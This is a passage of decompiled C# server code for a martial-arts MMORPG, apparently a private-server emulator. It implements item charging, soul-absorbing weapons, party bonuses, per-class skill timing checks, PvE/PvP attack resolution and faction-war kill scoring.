						凝神珠包裹[i].FLD_MAGIC0 = 凝神珠包裹[i].FLD_MAGIC1;
						byte[] array = new byte[77];
						long dBItmeId = RxjhClass.GetDBItmeId();
						BitConverter.GetBytes(dBItmeId);
						Buffer.BlockCopy(凝神珠包裹[i].物品全局ID, 0, array, 0, 8);
						Buffer.BlockCopy(BitConverter.GetBytes(1008000315), 0, array, 8, 4);
						Buffer.BlockCopy(BitConverter.GetBytes(1), 0, array, 12, 4);
						Buffer.BlockCopy(凝神珠包裹[i].物品_byte, 16, array, 16, World.物品属性大小);
						凝神珠包裹[i].物品_byte = array;
						初始化凝神珠包裹();
					}
				}
				if (!flag)
				{
					凝神珠操作包(3, i, BitConverter.ToInt32(凝神珠包裹[i].物品ID, 0), 凝神珠包裹[i].FLD_MAGIC1, 凝神珠包裹[i].FLD_MAGIC0);
				}
			}
			int 凝神宝珠位置 = base.凝神宝珠位置;
			if (凝神宝珠位置 == -1)
			{
				return;
			}
			if (id == 3)
			{
				int num3 = (int)(经验 / 8.0);
				if (num3 < 0)
				{
					num3 = 1;
				}
				if (公有药品.ContainsKey(1008000312) || 公有药品.ContainsKey(1008000311))
				{
					num3 *= 2;
				}
				装备栏包裹[凝神宝珠位置].FLD_MAGIC0 += num3;
				if (装备栏包裹[凝神宝珠位置].FLD_MAGIC0 >= 装备栏包裹[凝神宝珠位置].FLD_MAGIC1)
				{
					byte[] bytes = BitConverter.GetBytes(1008000315);
					byte[] bytes2 = BitConverter.GetBytes(1);
					byte[] array2 = new byte[20];
					Buffer.BlockCopy(BitConverter.GetBytes(装备栏包裹[凝神宝珠位置].FLD_MAGIC1), 0, array2, 0, 4);
					Buffer.BlockCopy(BitConverter.GetBytes(装备栏包裹[凝神宝珠位置].FLD_MAGIC1), 0, array2, 4, 4);
					byte[] bytes3 = BitConverter.GetBytes(RxjhClass.GetDBItmeId());
					减去物品(凝神宝珠位置, 1);
					增加物品2(bytes3, bytes, 凝神宝珠位置, bytes2, array2);
					base.凝神宝珠位置 = -1;
					return;
				}
			}
			using 发包类 发包类 = new 发包类();
			发包类.Write4(id);
			发包类.Write4(凝神宝珠位置);
			发包类.Write4(BitConverter.ToInt32(装备栏包裹[凝神宝珠位置].物品ID, 0));
			发包类.Write4(0);
			发包类.Write4(装备栏包裹[凝神宝珠位置].FLD_MAGIC1);
			发包类.Write4(装备栏包裹[凝神宝珠位置].FLD_MAGIC0);
			if (base.Client != null)
			{
				base.Client.SendPak(发包类, 57368, base.人物全服ID);
			}
		}

		public void 吸魂(int 怪ID)
		{
			int num = RNG.Next(1, 100);
			if (base.FLD_VIP == 1)
			{
				num -= 15;
			}
			if (base.FLD_人物_追加_吸魂几率百分比 > 0.0)
			{
				num -= (int)base.FLD_人物_追加_吸魂几率百分比;
			}
			if (num - 中级附魂_吸魂 > World.吸魂机率)
			{
				return;
			}
			int num2 = BitConverter.ToInt32(装备栏包裹[0].物品ID, 0);
			switch (num2)
			{
			case 1000000321:
			case 1000000323:
			case 1000000325:
			case 1000000327:
			{
				if (RNG.Next(0, 2699) > 装备栏包裹[0].FLD_MAGIC0)
				{
					break;
				}
				吸魂动做包(怪ID);
				显示大字(base.人物全服ID, 402);
				int num3 = RNG.Next(1, 2);
				switch (num2)
				{
				case 1000000321:
					装备栏包裹[0].FLD_MAGIC2 += num3;
					吸魂数量包(num3);
					if (装备栏包裹[0].FLD_MAGIC2 >= 装备栏包裹[0].FLD_MAGIC1)
					{
						减去物品(0, 1);
						增加物品2(BitConverter.GetBytes(RxjhClass.GetDBItmeId()), BitConverter.GetBytes(1000000771), 0, BitConverter.GetBytes(1), new byte[20]);
					}
					break;
				case 1000000323:
					装备栏包裹[0].FLD_MAGIC2 += num3;
					吸魂数量包(num3);
					if (装备栏包裹[0].FLD_MAGIC2 >= 装备栏包裹[0].FLD_MAGIC1)
					{
						减去物品(0, 1);
						增加物品2(BitConverter.GetBytes(RxjhClass.GetDBItmeId()), BitConverter.GetBytes(1000000772), 0, BitConverter.GetBytes(1), new byte[20]);
					}
					break;
				case 1000000325:
					装备栏包裹[0].FLD_MAGIC2 += num3;
					吸魂数量包(num3);
					if (装备栏包裹[0].FLD_MAGIC2 >= 装备栏包裹[0].FLD_MAGIC1)
					{
						减去物品(0, 1);
						增加物品2(BitConverter.GetBytes(RxjhClass.GetDBItmeId()), BitConverter.GetBytes(1000000773), 0, BitConverter.GetBytes(1), new byte[20]);
					}
					break;
				case 1000000327:
					装备栏包裹[0].FLD_MAGIC2 += num3;
					吸魂数量包(num3);
					if (装备栏包裹[0].FLD_MAGIC2 >= 装备栏包裹[0].FLD_MAGIC1)
					{
						减去物品(0, 1);
						增加物品2(BitConverter.GetBytes(RxjhClass.GetDBItmeId()), BitConverter.GetBytes(1000000774), 0, BitConverter.GetBytes(1), new byte[20]);
					}
					break;
				case 1000000322:
				case 1000000324:
				case 1000000326:
					break;
				}
				break;
			}
			case 1000000322:
			case 1000000324:
			case 1000000326:
				break;
			}
		}

		public void 吸魂动做包(int 怪ID)
		{
			using 发包类 发包类 = new 发包类();
			发包类.Write4(怪ID);
			发包类.Write4(BitConverter.ToInt32(装备栏包裹[0].物品ID, 0));
			发包类.Write4(装备栏包裹[0].FLD_MAGIC1);
			if (base.Client != null)
			{
				base.Client.SendPak(发包类, 55576, base.人物全服ID);
			}
			发送当前范围广播数据(发包类, 55576, base.人物全服ID);
		}

		public void 吸魂数量包(int 数量)
		{
			using 发包类 发包类 = new 发包类();
			发包类.Write4(1);
			发包类.Write(装备栏包裹[0].物品_byte, 0, 12);
			发包类.Write4(0);
			发包类.Write4(数量);
			发包类.Write4(0);
			发包类.Write4(1);
			发包类.Write4(0);
			发包类.Write(装备栏包裹[0].物品_byte, 16, 40);
			if (base.Client != null)
			{
				base.Client.SendPak(发包类, 8960, base.人物全服ID);
			}
		}

		public double 获得队伍加成(TeamClass 组队a)
		{
			double num = 0.0;
			if (组队a.组队列表.Count < 7)
			{
				return num;
			}
			if (组队a.组队列表.Count == 8)
			{
				num += 0.15;
			}
			bool flag = false;
			bool flag2 = false;
			bool flag3 = false;
			bool flag4 = false;
			bool flag5 = false;
			bool flag6 = false;
			bool flag7 = false;
			foreach (Players value in 组队a.组队列表.Values)
			{
				if (查找范围玩家(700, value) && value.人物_HP > 0 && !value.Player死亡)
				{
					switch (value.Player_Job)
					{
					case 1:
						flag = true;
						break;
					case 2:
						flag2 = true;
						break;
					case 3:
						flag3 = true;
						break;
					case 4:
						flag4 = true;
						break;
					case 5:
						flag5 = true;
						break;
					case 6:
						flag6 = true;
						break;
					case 7:
						flag7 = true;
						break;
					}
				}
			}
			if (flag && flag2 && flag3 && flag4 && flag5 && flag7 && flag6)
			{
				num += 0.15;
			}
			return num;
		}

		public bool IsTimeOut(int job, int mode, int time)
		{
			switch (mode)
			{
			case 126:
				switch (job)
				{
				case 1:
					if (time < 400)
					{
						return false;
					}
					break;
				case 2:
					if (time < 440)
					{
						return false;
					}
					break;
				case 3:
					if (time < 800)
					{
						return false;
					}
					break;
				case 4:
					if (time < 900)
					{
						return false;
					}
					break;
				case 5:
					if (time < 780)
					{
						return false;
					}
					break;
				case 6:
					if (time < 380)
					{
						return false;
					}
					break;
				}
				break;
			case 127:
				switch (job)
				{
				case 1:
					if (time < 500)
					{
						return false;
					}
					break;
				case 2:
					if (time < 540)
					{
						return false;
					}
					break;
				case 3:
					if (time < 760)
					{
						return false;
					}
					break;
				case 4:
					if (time < 1380)
					{
						return false;
					}
					break;
				case 5:
					if (time < 1050)
					{
						return false;
					}
					break;
				case 6:
					if (time < 350)
					{
						return false;
					}
					break;
				}
				break;
			case 128:
				switch (job)
				{
				case 1:
					if (time < 350)
					{
						return false;
					}
					break;
				case 2:
					if (time < 360)
					{
						return false;
					}
					break;
				case 3:
					if (time < 610)
					{
						return false;
					}
					break;
				case 4:
					if (time < 1350)
					{
						return false;
					}
					break;
				case 5:
					return false;
				}
				break;
			case 129:
				switch (job)
				{
				case 1:
					if (time < 320)
					{
						return false;
					}
					break;
				case 2:
					if (time < 350)
					{
						return false;
					}
					break;
				case 3:
					if (time < 745)
					{
						return false;
					}
					break;
				case 4:
					if (time < 1300)
					{
						return false;
					}
					break;
				case 5:
					return false;
				case 6:
					if (time < 500)
					{
						return false;
					}
					break;
				}
				break;
			case 130:
				switch (job)
				{
				case 1:
					if (time < 340)
					{
						return false;
					}
					break;
				case 2:
					if (time < 475)
					{
						return false;
					}
					break;
				case 3:
					if (time < 450)
					{
						return false;
					}
					break;
				case 4:
					if (time < 1350)
					{
						return false;
					}
					break;
				case 5:
					return false;
				case 6:
					if (time < 580)
					{
						return false;
					}
					break;
				}
				break;
			case 131:
				switch (job)
				{
				case 1:
					if (time < 480)
					{
						return false;
					}
					break;
				case 2:
					if (time < 490)
					{
						return false;
					}
					break;
				case 3:
					if (time < 700)
					{
						return false;
					}
					break;
				case 4:
					if (time < 1350)
					{
						return false;
					}
					break;
				case 5:
					return false;
				case 6:
					if (time < 380)
					{
						return false;
					}
					break;
				}
				break;
			case 132:
				switch (job)
				{
				case 1:
					if (time < 630)
					{
						return false;
					}
					break;
				case 2:
					if (time < 500)
					{
						return false;
					}
					break;
				case 3:
					if (time < 590)
					{
						return false;
					}
					break;
				case 4:
					if (time < 1350)
					{
						return false;
					}
					break;
				case 5:
					return false;
				case 6:
					if (time < 270)
					{
						return false;
					}
					break;
				}
				break;
			case 133:
				switch (job)
				{
				case 1:
					if (time < 205)
					{
						return false;
					}
					break;
				case 2:
					if (time < 210)
					{
						return false;
					}
					break;
				case 3:
					if (time < 185)
					{
						return false;
					}
					break;
				case 4:
					if (time < 1350)
					{
						return false;
					}
					break;
				case 5:
					return false;
				case 6:
					if (time < 400)
					{
						return false;
					}
					break;
				}
				break;
			case 134:
				switch (job)
				{
				case 1:
					if (time < 980)
					{
						return false;
					}
					break;
				case 2:
					if (time < 750)
					{
						return false;
					}
					break;
				case 3:
					if (time < 725)
					{
						return false;
					}
					break;
				case 4:
					if (time < 1650)
					{
						return false;
					}
					break;
				case 5:
					return false;
				case 6:
					if (time < 200)
					{
						return false;
					}
					break;
				}
				break;
			case 136:
				switch (job)
				{
				case 6:
					if (time < 200)
					{
						return false;
					}
					break;
				case 4:
					if (time < 750)
					{
						return false;
					}
					break;
				}
				break;
			}
			return true;
		}

		public int Get连环确认时间(int PlayJob, int nActType, int nTimer)
		{
			int result = 300;
			switch (nActType)
			{
			case 126:
				if (PlayJob == 6 && nTimer == 1)
				{
					result = 430;
				}
				break;
			case 127:
				if (PlayJob == 6 && nTimer == 1)
				{
					result = 240;
				}
				break;
			case 128:
				switch (PlayJob)
				{
				case 1:
					result = ((nTimer != 1) ? 500 : 520);
					break;
				case 2:
					result = ((nTimer != 1) ? 290 : 370);
					break;
				case 3:
					result = ((nTimer != 1) ? 600 : 320);
					break;
				case 4:
					result = ((nTimer != 1) ? 740 : 700);
					break;
				}
				break;
			case 129:
				switch (PlayJob)
				{
				case 1:
					result = ((nTimer != 1) ? 580 : 320);
					break;
				case 2:
					result = ((nTimer != 1) ? 370 : 220);
					break;
				case 3:
					result = ((nTimer != 1) ? 900 : 540);
					break;
				case 4:
					switch (nTimer)
					{
					case 2:
						result = 750;
						break;
					case 1:
						result = 600;
						break;
					}
					break;
				case 6:
					switch (nTimer)
					{
					case 1:
						result = 170;
						break;
					case 2:
						result = 550;
						break;
					case 3:
						result = 380;
						break;
					case 4:
						result = 820;
						break;
					}
					break;
				}
				break;
			case 130:
				switch (PlayJob)
				{
				case 1:
					result = ((nTimer != 1) ? 610 : 550);
					break;
				case 2:
					result = ((nTimer != 1) ? 340 : 570);
					break;
				case 3:
					result = ((nTimer != 1) ? 900 : 530);
					break;
				case 6:
					switch (nTimer)
					{
					case 1:
						result = 500;
						break;
					case 2:
						result = 285;
						break;
					case 3:
						result = 290;
						break;
					case 4:
						result = 800;
						break;
					}
					break;
				}
				break;
			case 131:
				switch (PlayJob)
				{
				case 1:
					result = ((nTimer != 1) ? 420 : 440);
					break;
				case 2:
					result = ((nTimer != 1) ? 630 : 340);
					break;
				case 3:
					result = ((nTimer != 1) ? 820 : 770);
					break;
				case 6:
					switch (nTimer)
					{
					case 1:
						result = 400;
						break;
					case 2:
						result = 650;
						break;
					case 3:
						result = 600;
						break;
					case 4:
						result = 700;
						break;
					}
					break;
				}
				break;
			case 132:
				switch (PlayJob)
				{
				case 1:
					result = ((nTimer != 1) ? 680 : 670);
					break;
				case 2:
					result = ((nTimer != 1) ? 850 : 280);
					break;
				case 3:
					result = ((nTimer != 1) ? 900 : 540);
					break;
				case 6:
					switch (nTimer)
					{
					case 1:
						result = 520;
						break;
					case 2:
						result = 750;
						break;
					case 3:
						result = 320;
						break;
					case 4:
						result = 730;
						break;
					}
					break;
				}
				break;
			case 133:
				switch (PlayJob)
				{
				case 1:
					result = ((nTimer != 1) ? 700 : 660);
					break;
				case 2:
					result = ((nTimer != 1) ? 410 : 770);
					break;
				case 3:
					result = ((nTimer != 1) ? 320 : 540);
					break;
				case 6:
					switch (nTimer)
					{
					case 1:
						result = 290;
						break;
					case 2:
						result = 610;
						break;
					case 3:
						result = 230;
						break;
					case 4:
						result = 570;
						break;
					}
					break;
				}
				break;
			}
			return result;
		}

		public void 攻击确认(int 攻击者人物ID, int 人物ID, int 攻击模式)
		{
			try
			{
				if (攻击确认次数 < 1)
				{
					攻击列表.Clear();
					return;
				}
				攻击确认次数--;
				攻击类 攻击类2 = null;
				using (new Lock(攻击列表, "攻击列表"))
				{
					if (攻击列表.Count < 1)
					{
						return;
					}
					if (攻击列表.Count > 1)
					{
						foreach (攻击类 item in 攻击列表)
						{
							if (item.人物ID == 人物ID)
							{
								攻击类2 = item;
								break;
							}
						}
					}
					else
					{
						攻击类2 = 攻击列表[0];
					}
				}
				if (攻击类2 == null)
				{
					return;
				}
				int 武功ID = 攻击类2.武功ID;
				if (人物ID >= 10000)
				{
					for (int i = 0; i < 15; i++)
					{
						ItmeClass itmeID = ItmeClass.GetItmeID(BitConverter.ToInt32(装备栏已穿装备[i].物品ID, 0));
						if (itmeID != null && World.防具PK掉耐久度 != 0 && (itmeID.FLD_RESIDE2 == 1 || itmeID.FLD_RESIDE2 == 2 || itmeID.FLD_RESIDE2 == 5 || itmeID.FLD_RESIDE2 == 6) && itmeID.FLD_NJ > 0 && 装备栏已穿装备[i].FLD_FJ_NJ > 0)
						{
							装备栏已穿装备[i].FLD_FJ_NJ -= World.防具PK掉耐久度;
							if (装备栏已穿装备[i].FLD_FJ_NJ < 0)
							{
								装备栏已穿装备[i].FLD_FJ_NJ = 0;
							}
							break;
						}
					}
					if (装备栏已穿装备[3].FLD_FJ_NJ > 0 && World.武器PK掉耐久度 != 0)
					{
						装备栏已穿装备[3].FLD_FJ_NJ -= World.武器PK掉耐久度;
						if (装备栏已穿装备[3].FLD_FJ_NJ < 0)
						{
							装备栏已穿装备[3].FLD_FJ_NJ = 0;
						}
					}
					if (base.人物善恶 < 0)
					{
						base.人物善恶 += RNG.Next(50, 200);
					}
					int num = 0;
					int num3 = 0;
					try
					{
						using (new Lock(攻击列表, "攻击列表"))
						{
							foreach (攻击类 item2 in 攻击列表)
							{
								if (num3 <= 4)
								{
									if (item2.人物ID == 人物ID)
									{
										num += item2.攻击力;
										num3++;
									}
									continue;
								}
								break;
							}
						}
					}
					catch (Exception ex)
					{
						报错次数阀值++;
						if (World.是否开启票红字 == 1)
						{
							系统提示("你攻击确认怪物出错, 请联系客服处理");
							MainForm.WriteLine(1, "攻击确认怪物列表[" + base.Userid + "]-[" + base.UserName + "]-[" + 报错次数阀值 + "]" + ex.Message);
						}
					}
					if (攻击类2.武功ID == 0)
					{
						if (MapClass.GetnpcTemplate(base.人物坐标_地图).TryGetValue(攻击类2.人物ID, out var value))
						{
							value.Play_Add(this);
							value.Rxjh_HP -= num;
							value.Play_Hit(this, num);
							if (value.ContainsKeyInAbnormalState(44))
							{
								value.阎王爆累计伤害 += num;
							}
							if (value.Rxjh_HP <= 0 && !value.NPC死亡)
							{
								value.势力战打怪得分(this, num);
								value.发送死亡数据(base.人物全服ID);
								吸魂(人物ID);
								拳师连击控制 = 0;
								攻击列表.Clear();
							}
							else
							{
								if (value.自动攻击 != null && !value.自动攻击.Enabled)
								{
									value.自动移动.Enabled = false;
									value.自动攻击.Enabled = true;
								}
								if (攻击模式 < 150)
								{
									物理攻击人物ID = 人物ID;
									if (自动攻击 != null)
									{
										自动攻击.Enabled = false;
										自动攻击.Close();
										自动攻击.Dispose();
										自动攻击 = null;
									}
									自动攻击 = new System.Timers.Timer(300.0);
									自动攻击.Elapsed += 自动攻击事件;
									自动攻击.Enabled = true;
									自动攻击.AutoReset = true;
								}
								else
								{
									攻击列表.Clear();
								}
							}
							攻击列表.Clear();
						}
						goto IL_2467;
					}
					if (!World.TBL_KONGFU.TryGetValue(攻击类2.武功ID, out var value7))
					{
						return;
					}
					if (自动攻击 != null)
					{
						自动攻击.Enabled = false;
						自动攻击.Close();
						自动攻击.Dispose();
						自动攻击 = null;
					}
					if (base.Player_Job == 6 && value7.FLD_PID == 801303)
					{
						更新HP_MP_SP();
						return;
					}
					if (MapClass.GetnpcTemplate(base.人物坐标_地图).TryGetValue(攻击类2.人物ID, out var value8))
					{
						if (value7.FLD_TYPE == 4 || 触发流星漫天 || 触发杀星义气虎 || 触发杀星义气杀)
						{
							触发流星漫天 = false;
							触发杀星义气虎 = false;
							触发杀星义气杀 = false;
							value8.Play_Add(this);
							value8.Rxjh_HP -= num;
							value8.Play_Hit(this, num);
							if (value8.ContainsKeyInAbnormalState(44))
							{
								value8.阎王爆累计伤害 += num;
							}
							if (value8.Rxjh_HP <= 0 && !value8.NPC死亡)
							{
								value8.发送死亡数据(base.人物全服ID);
								value8.势力战打怪得分(this, num);
								吸魂(人物ID);
								攻击列表.Clear();
							}
							else
							{
								if (value8.自动攻击 != null && !value8.自动攻击.Enabled)
								{
									value8.自动移动.Enabled = false;
									value8.自动攻击.Enabled = true;
								}
								if (武功连击记数器 > 0)
								{
									if (自动攻击 != null)
									{
										自动攻击.Close();
										自动攻击.Dispose();
										自动攻击 = null;
									}
									魔法攻击(攻击类2.武功ID, 人物ID);
								}
								else
								{
									攻击列表.Clear();
								}
							}
							foreach (群攻击类 item3 in 攻击类2.群攻)
							{
								if (!NpcList.TryGetValue(item3.人物ID, out var value9) || value9.FLD_INDEX == value8.FLD_INDEX)
								{
									continue;
								}
								value9.Play_Add(this);
								value9.Rxjh_HP -= item3.攻击力;
								value9.Play_Hit(this, item3.攻击力);
								if (value9.ContainsKeyInAbnormalState(44))
								{
									value9.阎王爆累计伤害 += item3.攻击力;
								}
								if (value9.Rxjh_HP <= 0 && !value9.NPC死亡)
								{
									value9.势力战打怪得分(this, item3.攻击力);
									value9.发送死亡数据(base.人物全服ID);
									吸魂(人物ID);
									攻击列表.Clear();
									continue;
								}
								if (value9.自动攻击 != null && !value9.自动攻击.Enabled)
								{
									value9.自动移动.Enabled = false;
									value9.自动攻击.Enabled = true;
								}
								if (武功连击记数器 > 0)
								{
									if (自动攻击 != null)
									{
										自动攻击.Close();
										自动攻击.Dispose();
										自动攻击 = null;
									}
									魔法攻击(攻击类2.武功ID, 人物ID);
								}
								else
								{
									攻击列表.Clear();
								}
							}
						}
						else
						{
							value8.Play_Add(this);
							value8.Rxjh_HP -= num;
							value8.Play_Hit(this, num);
							if (value8.ContainsKeyInAbnormalState(44))
							{
								value8.阎王爆累计伤害 += num;
							}
							if (value8.Rxjh_HP <= 0 && !value8.NPC死亡)
							{
								value8.势力战打怪得分(this, num);
								value8.发送死亡数据(base.人物全服ID);
								吸魂(人物ID);
								拳师连击控制 = 0;
								攻击列表.Clear();
							}
							else
							{
								if (value8.自动攻击 != null && !value8.自动攻击.Enabled)
								{
									value8.自动移动.Enabled = false;
									value8.自动攻击.Enabled = true;
								}
								if (武功连击记数器 > 0)
								{
									if (自动攻击 != null)
									{
										自动攻击.Close();
										自动攻击.Dispose();
										自动攻击 = null;
									}
									魔法攻击(攻击类2.武功ID, 人物ID);
								}
								else
								{
									攻击列表.Clear();
								}
							}
						}
						攻击列表.Clear();
					}
					goto IL_2467;
				}
				if (!PlayList.TryGetValue(攻击类2.人物ID, out var value10))
				{
					return;
				}
				int num4 = 0;
				int num5 = 0;
				if (value10.是假人)
				{
					value10.假人反击PKindex = base.人物全服ID;
				}
				try
				{
					using (new Lock(攻击列表, "攻击列表"))
					{
						foreach (攻击类 item4 in 攻击列表)
						{
							if (num5 > World.卡技能次数)
							{
								break;
							}
							if (item4.人物ID == 人物ID)
							{
								num4 += item4.攻击力;
								if (base.当前激活技能ID != 0)
								{
									break;
								}
								num5++;
							}
						}
					}
					for (int j = 0; j < 15; j++)
					{
						ItmeClass itmeID2 = ItmeClass.GetItmeID(BitConverter.ToInt32(value10.装备栏已穿装备[j].物品ID, 0));
						if (itmeID2 != null && World.防具PK掉耐久度 != 0 && (itmeID2.FLD_RESIDE2 == 1 || itmeID2.FLD_RESIDE2 == 2 || itmeID2.FLD_RESIDE2 == 5 || itmeID2.FLD_RESIDE2 == 6) && itmeID2.FLD_NJ > 0 && value10.装备栏已穿装备[j].FLD_FJ_NJ > 0)
						{
							value10.装备栏已穿装备[j].FLD_FJ_NJ -= World.防具PK掉耐久度;
							if (value10.装备栏已穿装备[j].FLD_FJ_NJ < 0)
							{
								value10.装备栏已穿装备[j].FLD_FJ_NJ = 0;
							}
							break;
						}
					}
					if (装备栏已穿装备[3].FLD_FJ_NJ > 0 && World.武器PK掉耐久度 != 0)
					{
						装备栏已穿装备[3].FLD_FJ_NJ -= World.武器PK掉耐久度;
						if (装备栏已穿装备[3].FLD_FJ_NJ < 0)
						{
							装备栏已穿装备[3].FLD_FJ_NJ = 0;
						}
					}
				}
				catch (Exception ex2)
				{
					攻击列表.Clear();
					报错次数阀值++;
					MainForm.WriteLine(1, "攻击确认人物列表[" + base.Userid + "]-[" + base.UserName + "]-[" + 报错次数阀值 + "]" + ex2.Message);
				}
				if (value10.Player_Job == 3)
				{
					if (value10.枪_狂神降世 != 0.0 && !value10.怒)
					{
						value10.人物_SP += (int)(3.0 + (double)(value10.Player_Level * 2) * value10.枪_狂神降世);
					}
				}
				else if (value10.Player_Job == 10)
				{
					if (value10.拳师_狂神降世 != 0.0 && !value10.怒)
					{
						value10.人物_SP += (int)(3.0 + (double)(value10.Player_Level * 2) * value10.拳师_狂神降世);
					}
				}
				else if (value10.Player_Job == 6)
				{
					if (value10.刺_荆轲之怒 != 0.0)
					{
						value10.人物_SP += (int)(3.0 + (double)value10.Player_Level * 0.5 * 0.01 * value10.刺_荆轲之怒);
					}
					else if (num4 <= 0)
					{
						value10.人物_SP++;
					}
					else
					{
						value10.人物_SP += 2;
					}
				}
				else if (value10.Player_Job == 7)
				{
					if (num4 <= 0)
					{
						value10.人物_SP++;
					}
					else
					{
						value10.人物_SP += 2;
					}
				}
				else if (num4 <= 0)
				{
					if (!value10.怒)
					{
						value10.人物_SP++;
					}
				}
				else if (!value10.怒)
				{
					value10.人物_SP += 2;
				}
				if (value10.FLD_装备_追加_愤怒 > 0 && !value10.怒)
				{
					value10.人物_SP += base.FLD_装备_追加_愤怒;
				}
				if (base.FLD_装备_追加_初始化愤怒概率百分比 > 0.0 && (double)RNG.Next(1, 100) <= base.FLD_装备_追加_初始化愤怒概率百分比)
				{
					value10.人物_SP = 0;
				}
				if (num4 <= 0)
				{
					num4 = 1;
				}
				value10.人物_HP -= num4;
				if (!value10.检查毒蛇出洞状态())
				{
					if (value10.Player_Job == 1)
					{
						if ((double)RNG.Next(1, 100) <= value10.人反伤几率)
						{
							int num6 = num4;
							if (num6 <= 0)
							{
								num6 = 1;
							}
							if ((double)RNG.Next(1, 100) <= value10.刀_升天二气功_穷途末路)
							{
								value10.显示大字(value10.人物全服ID, 19);
								num6 *= 2;
							}
							if (base.Player_Job == 9 && (double)RNG.Next(1, 110) <= base.谭_升天三气功_以柔克刚 + base.升天五式_惊涛骇浪)
							{
								显示大字(base.人物全服ID, 700);
								num6 = 0;
							}
							发送反伤攻击数据(num6, value10.人物全服ID);
							if (num6 <= 0)
							{
								num6 = 1;
							}
							base.人物_HP -= num6;
							if (base.人物_HP <= 0)
							{
								if (自动攻击 != null)
								{
									自动攻击.Enabled = false;
									自动攻击.Close();
									自动攻击.Dispose();
									自动攻击 = null;
								}
								value10.武勋系统(value10, this);
								PK死亡 = true;
								base.人物_HP = 0;
								最终致命一击 = num6;
								死亡(base.人物全服ID);
							}
						}
					}
					else if (value10.Player_Job == 2)
					{
						if ((double)RNG.Next(1, 100) <= value10.剑_升天三气功_火凤临朝 && value10.人物_HP <= 0)
						{
							value10.人物_HP = 10;
							value10.显示大字(value10.人物全服ID, 322);
						}
					}
					else if (value10.Player_Job == 7)
					{
						if ((double)RNG.Next(1, 100) <= value10.琴师_升天二气功_三潭映月 * 0.3 + 3.0)
						{
							value10.显示大字(value10.人物全服ID, 391);
							int num7 = num4;
							if (num7 <= 0)
							{
								num7 = 1;
							}
							base.人物_HP -= num7;
							if (base.人物_HP <= 0)
							{
								if (自动攻击 != null)
								{
									自动攻击.Enabled = false;
									自动攻击.Close();
									自动攻击.Dispose();
									自动攻击 = null;
								}
								value10.武勋系统(value10, this);
								PK死亡 = true;
								base.人物_HP = 0;
								最终致命一击 = num7;
								死亡(base.人物全服ID);
							}
						}
					}
					else if (value10.Player_Job == 8)
					{
						if ((double)RNG.Next(1, 110) <= value10.韩_追骨吸元)
						{
							int num8 = (int)((double)num4 * value10.韩_追骨吸元 * 0.01);
							if (num8 <= 0)
							{
								num8 = 1;
							}
							if (base.Player_Job == 9 && (double)RNG.Next(0, 100) < base.谭_升天三气功_以柔克刚 + base.升天五式_惊涛骇浪)
							{
								显示大字(base.人物全服ID, 700);
								num8 = 0;
							}
							value10.加血(num8);
							base.人物_HP -= num8;
							if (base.人物_HP <= 0)
							{
								if (自动攻击 != null)
								{
									自动攻击.Enabled = false;
									自动攻击.Close();
									自动攻击.Dispose();
									自动攻击 = null;
								}
								value10.武勋系统(value10, this);
								PK死亡 = true;
								base.人物_HP = 0;
								最终致命一击 = num8;
								死亡(base.人物全服ID);
							}
						}
					}
					else if (value10.Player_Job == 9 && (double)RNG.Next(1, 100) <= value10.谭_升天三气功_火凤临朝 && value10.人物_HP <= 0)
					{
						value10.人物_HP = 10;
						value10.显示大字(value10.人物全服ID, 322);
					}
				}
				if (锁定人物几率 > 0 && (double)RNG.Next(1, 100) <= (double)锁定人物几率)
				{
					if (value10.异常状态 != null)
					{
						if (!value10.GetAbnormalState(17))
						{
							double num9 = 2000.0;
							异常状态类 value11 = new 异常状态类(value10, (int)num9, 17, 0.0);
							value10.异常状态.Add(17, value11);
							value10.人物锁定 = true;
						}
					}
					else
					{
						value10.异常状态 = new ThreadSafeDictionary<int, 异常状态类>();
						double num10 = 2000.0;
						异常状态类 value12 = new 异常状态类(value10, (int)num10, 17, 0.0);
						value10.异常状态.Add(17, value12);
						value10.人物锁定 = true;
					}
				}
				攻击列表.Clear();
				if (value10.人物_HP <= 0)
				{
					if (自动攻击 != null)
					{
						自动攻击.Enabled = false;
						自动攻击.Close();
						自动攻击.Dispose();
						自动攻击 = null;
					}
					value10.PK死亡 = true;
					value10.人物_HP = 0;
					value10.最终致命一击 = num4;
					value10.死亡(base.人物全服ID);
					if (base.人物坐标_地图 != 7001 && base.人物坐标_地图 != 7101)
					{
						if (base.人物坐标_地图 == 41001)
						{
							if (World.仙魔大战进程 == 3)
							{
								if (base.UserNip != value10.UserNip || World.同IP势力战不计分 == 0)
								{
									if (检查玩家是否在仙魔大战区域内(this))
									{
										if (检查玩家是否在仙魔大战区域内(value10))
										{
											value10.仙魔大战死亡数++;
											base.仙魔大战杀人数++;
											if (World.仙魔Top.TryGetValue(base.UserName, out var value13))
											{
												value13.杀人数++;
											}
											else
											{
												value13 = new 仙魔大战top
												{
													人物名 = base.UserName,
													等级 = base.Player_Level,
													职业 = base.Player_Job,
													势力 = ((!(base.仙魔大战派别 == "仙族")) ? "魔族" : "仙族"),
													帮派 = base.帮派名字,
													杀人数 = 1,
													死亡数 = 0
												};
												World.仙魔Top.TryAdd(base.UserName, value13);
											}
											if (World.仙魔Top.TryGetValue(value10.UserName, out var value14))
											{
												value14.死亡数++;
											}
											else
											{
												仙魔大战top 仙魔大战top2 = new 仙魔大战top
												{
													人物名 = value10.UserName,
													等级 = value10.Player_Level,
													职业 = value10.Player_Job
												};
												value13.势力 = ((!(base.仙魔大战派别 == "仙族")) ? "魔族" : "仙族");
												仙魔大战top2.帮派 = value10.帮派名字;
												仙魔大战top2.杀人数 = 0;
												仙魔大战top2.死亡数 = 1;
												World.仙魔Top.TryAdd(value10.UserName, 仙魔大战top2);
											}
											if (base.仙魔大战派别 == "仙族")
											{
												World.仙魔大战正分数 += (int)((double)value10.Player_Level * 0.15);
											}
											else if (base.仙魔大战派别 == "魔族")
											{
												World.仙魔大战邪分数 += (int)((double)value10.Player_Level * 0.15);
											}
											系统提示("当前仙魔大战杀人数[" + base.仙魔大战杀人数 + "]。");
											value10.系统提示("当前仙魔大战死亡数[" + value10.仙魔大战死亡数 + "]。");
										}
										else
										{
											系统提示("对方已超出仙魔大战对战范围, 不能获得分数。");
										}
									}
									else
									{
										系统提示("你已超出仙魔大战对战范围, 不能获得分数。");
									}
								}
								else
								{
									系统提示("杀死同IP玩家不能获得分数。");
								}
							}
						}
						else if (base.人物坐标_地图 == 801)
						{
							if (World.势力战进程 == 3)
							{
								if (base.UserNip != value10.UserNip || World.同IP势力战不计分 == 0)
								{
									if (检查玩家是否在势力战区域内(this))
									{
										if (检查玩家是否在势力战区域内(value10))
										{
											value10.势力战死亡数++;
